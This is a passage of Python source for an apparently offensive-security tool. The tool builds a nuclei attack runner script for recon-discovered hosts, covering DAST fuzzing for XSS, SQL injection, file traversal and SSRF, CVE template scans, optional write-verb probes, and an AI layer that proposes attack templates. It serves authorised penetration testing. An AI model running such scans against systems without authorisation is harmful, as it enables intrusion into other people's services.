            tmpl_count[f"fuzz:{lane}"] += 1
            tf = os.path.join(tgt, f"{fname[lane]}_urls.txt")
            with open(tf, "w") as fh:
                fh.write("\n".join(urls) + "\n")
            manifest["targets"][fname[lane]] = {"file": os.path.relpath(tf, out_dir), "count": len(urls)}

    # tech tags → run the RIGHT community CVEs, not the whole tree
    with open(os.path.join(out_dir, "tech_tags.txt"), "w") as fh:
        fh.write(",".join(manifest["tech_tags"]) + "\n")

    manifest["template_counts"] = dict(tmpl_count)
    # Findings-informed second wave — what the first-pass results steered.
    manifest["findings_informed"] = {
        "findings_read": len(findings),
        "hot_hosts": sorted(finding_hosts & set(host_rank)),
        "followon_templates": tmpl_count.get("followon", 0),
    }
    # Recon summary — the grounded context the optional AI layer reasons over.
    manifest["recon_summary"] = {
        "target_hosts": host_rank,
        "tech_by_host": {h: sorted(tech.get(h, {}).get("techs", set()))[:12]
                         for h in host_rank[:15] if tech.get(h, {}).get("techs")},
        "lane_counts": dict(lane_counter.most_common()),
        "sample_endpoints": {lane: lane_samples[lane] for lane in lane_samples},
    }
    with open(os.path.join(out_dir, "synth_manifest.json"), "w") as fh:
        json.dump(manifest, fh, indent=2)

    _write_runner(out_dir, host_rank, manifest, emit_fuzz)
    return manifest, None


# ---------------------------------------------------------------------------
# Findings loader (for AI triage) — reads what nuclei / intel already produced
# ---------------------------------------------------------------------------

def load_findings(scan_dir):
    out = []
    for rel in ("12_nuclei_scanning/nuclei_results.txt",
                "12_nuclei_scanning/synth_results.txt",
                "23_internet_intel/intel_findings.jsonl"):
        p = os.path.join(scan_dir, rel)
        out.extend(_iter_jsonl(p))
    return out


def _write_runner(out_dir, hosts, manifest, emit_fuzz):
    lines = ["#!/usr/bin/env bash",
             "# ARISE synthesized attack runner — recon-scoped nuclei.",
             "# SAFE-BY-DEFAULT: GET/OPTIONS + OOB only. Run ONLY against authorised targets.",
             "set -u",
             'NUCLEI="${NUCLEI:-nuclei}"',
             'UA="${HUMAN_USER_AGENT:-Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)}"',
             'HERE="$(cd "$(dirname "$0")" && pwd)"',
             'OUT="$HERE/synth_findings.jsonl"; : > "$OUT"',
             'TAGS="$(cat "$HERE/tech_tags.txt" 2>/dev/null)"',
             "",
             "# 1) Per-host targeted templates (exposure / version-swap / methods / idor / graphql)",
             'for d in "$HERE"/generated-templates/*/ ; do',
             '  host="$(basename "$d")"; [ "$host" = "fuzz" ] && continue',
             '  echo "[synth] targeted → $host"',
             '  "$NUCLEI" -u "https://$host" -t "$d" -H "User-Agent: $UA" \\',
             '     -severity info,low,medium,high,critical -j -o "$OUT.tmp" 2>/dev/null && cat "$OUT.tmp" >> "$OUT"',
             "done",
             ""]
    if emit_fuzz:
        lines += [
            "# 2) Recon-scoped DAST fuzzing (only the classified param URLs per lane)",
            'for pair in "xss-reflect" "sqli-error" "lfi-traversal" "ssrf-oob"; do',
            '  tl="$HERE/targets/${pair}_urls.txt"; tf="$HERE/generated-templates/fuzz/${pair}.yaml"',
            '  [ -s "$tl" ] && [ -f "$tf" ] || continue',
            '  echo "[synth] dast → $pair ($(wc -l < "$tl") urls)"',
            '  "$NUCLEI" -l "$tl" -t "$tf" -dast -H "User-Agent: $UA" \\',
            '     -j -o "$OUT.tmp" 2>/dev/null && cat "$OUT.tmp" >> "$OUT"',
            "done",
            ""]
    lines += [
        "# 3) Tech-scoped community CVEs — only the tags recon actually detected",
        'if [ -n "$TAGS" ]; then',
        '  for d in "$HERE"/generated-templates/*/ ; do',
        '    host="$(basename "$d")"; [ "$host" = "fuzz" ] && continue',
        '    "$NUCLEI" -u "https://$host" -tags "$TAGS" -H "User-Agent: $UA" \\',
        '       -severity medium,high,critical -j -o "$OUT.tmp" 2>/dev/null && cat "$OUT.tmp" >> "$OUT"',
        "  done",
        "fi",
        'rm -f "$OUT.tmp"',
        'echo "[synth] done → $OUT ($(wc -l < "$OUT" 2>/dev/null || echo 0) findings)"']
    p = os.path.join(out_dir, "run_attacks.sh")
    with open(p, "w") as fh:
        fh.write("\n".join(lines) + "\n")
    os.chmod(p, 0o755)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main():
    ap = argparse.ArgumentParser(description="Recon-Driven Attack Synthesizer (ARISE L4)")
    ap.add_argument("scan_dir", help="path to a scan output directory")
    ap.add_argument("--out", help="output dir (default: <scan_dir>/08d_attack_synth)")
    ap.add_argument("--max-hosts", type=int, default=25, help="cap hosts (richest surface first)")
    ap.add_argument("--per-host-cap", type=int, default=60, help="cap paths per template")
    ap.add_argument("--no-fuzz", action="store_true", help="skip DAST fuzzing templates")
    ap.add_argument("--allow-mutation", action="store_true", help="include write-verb (PUT/DELETE) probes")
    ap.add_argument("--summary", action="store_true", help="print a human summary")
    ap.add_argument("--ai", action="store_true",
                    help="bounded AI layer: propose extra templates + triage findings (needs an API key)")
    ap.add_argument("--ai-provider", help="claude|openai|gemini|huggingface (default: env or claude)")
    ap.add_argument("--ai-model", help="override the model id")
    args = ap.parse_args()

    if not os.path.isdir(args.scan_dir):
        print(f"error: not a directory: {args.scan_dir}", file=sys.stderr)
        return 2
    # Default matches the pipeline stage + the dashboard reader (08d_attack_synth).
    out_dir = args.out or os.path.join(args.scan_dir, "08d_attack_synth")
    os.makedirs(out_dir, exist_ok=True)

    manifest, err = synthesize(args.scan_dir, out_dir, args.max_hosts,
                               args.per_host_cap, not args.no_fuzz, args.allow_mutation)
    if err:
        print(f"[synth] {err}", file=sys.stderr)
        return 1

    counts = manifest["template_counts"]
    total = sum(counts.values())
    print(f"[synth] {total} templates from {manifest['endpoints_seen']} endpoints "
          f"across {manifest['hosts_considered']} hosts → {out_dir}")

    # ── Optional bounded AI layer ────────────────────────────────────────────
    if args.ai:
        try:
            import discovery.synth_ai as synth_ai
        except Exception as exc:  # noqa: BLE001
            print(f"[synth:ai] unavailable ({exc}) — deterministic output kept", file=sys.stderr)
            synth_ai = None
        if synth_ai:
            target_host = manifest["recon_summary"]["target_hosts"][0] \
                if manifest["recon_summary"]["target_hosts"] else os.path.basename(args.scan_dir)
            chat_fn, cerr = synth_ai.build_chat_fn(args.ai_provider, args.ai_model)
            if not chat_fn:
                print(f"[synth:ai] {cerr}", file=sys.stderr)
            else:
                scope = synth_ai.ScopeGuard(target_host,
                                            allowlist=manifest["recon_summary"]["target_hosts"])
                prop = synth_ai.propose_templates(manifest["recon_summary"], chat_fn, scope, out_dir)
                tri = synth_ai.triage_findings(load_findings(args.scan_dir), chat_fn)
                manifest["ai"] = {"proposals": prop, "triage": tri}
                with open(os.path.join(out_dir, "synth_manifest.json"), "w") as fh:
                    json.dump(manifest, fh, indent=2)
                with open(os.path.join(out_dir, "ai_triage.json"), "w") as fh:
                    json.dump(tri, fh, indent=2)
                nw = len(prop.get("written", []))
                nr = len(prop.get("repaired", []))
                nt = len(tri.get("triaged", []))
                print(f"[synth:ai] {nw} AI template(s) accepted"
                      + (f" ({nr} after nuclei-error repair)" if nr else "")
                      + (f", {len(prop['dropped'])} dropped" if prop.get("dropped") else "")
                      + f"; {nt} finding(s) triaged"
                      + (f" ({prop['error']})" if prop.get("error") else ""))
    if args.summary:
        for lane, n in sorted(counts.items(), key=lambda x: -x[1]):
            print(f"    {n:>4}  {lane}")
        for name, meta in manifest.get("targets", {}).items():
            print(f"    dast  {name}: {meta['count']} scoped URLs")
        if manifest["tech_tags"]:
            print(f"    tech tags → {','.join(manifest['tech_tags'][:12])}"
                  + (" ..." if len(manifest['tech_tags']) > 12 else ""))
        print(f"\n    run:  bash {os.path.join(out_dir, 'run_attacks.sh')}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
